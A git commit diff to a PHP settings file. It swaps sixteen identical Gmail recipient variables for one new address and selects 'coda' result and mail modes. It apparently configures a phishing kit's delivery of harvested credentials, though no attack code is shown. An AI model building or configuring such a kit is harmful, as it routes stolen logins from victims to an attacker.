09a26b424e4cc1d1fdb071c053ef00b854a94a7c
Wira Hardi Yudhistira <116948389+Wirayudhistira@users.noreply.github.com>
2024-06-26 18:09:44 +0700

    Update setting.php

--- setting.php
+++ setting.php
@@ -1,20 +1,5 @@
 <?php
-$email1 = 'uhuy223344@gmail.com';
-$email2 = 'uhuy223344@gmail.com';
-$email3 = 'uhuy223344@gmail.com';
-$email4 = 'uhuy223344@gmail.com';
-$email5 = 'uhuy223344@gmail.com';
-$email6 = 'uhuy223344@gmail.com';
-$email7 = 'uhuy223344@gmail.com';
-$email8 = 'uhuy223344@gmail.com';
-$email9 = 'uhuy223344@gmail.com';
-$email10 = 'uhuy223344@gmail.com';
-$email11 = 'uhuy223344@gmail.com';
-$email12 = 'uhuy223344@gmail.com';
-$email13 = 'uhuy223344@gmail.com';
-$email14 = 'uhuy223344@gmail.com';
-$email15 = 'uhuy223344@gmail.com';
-$email16 = 'uhuy223344@gmail.com';
+$email1 = 'laptopxlf@gmail.com';
 $jenisress = $coda; //$coda, $spin, $claim
 $jenismail = $coda_mail; //$coda_mail, $spin_mail, $claim_mail
 ?>
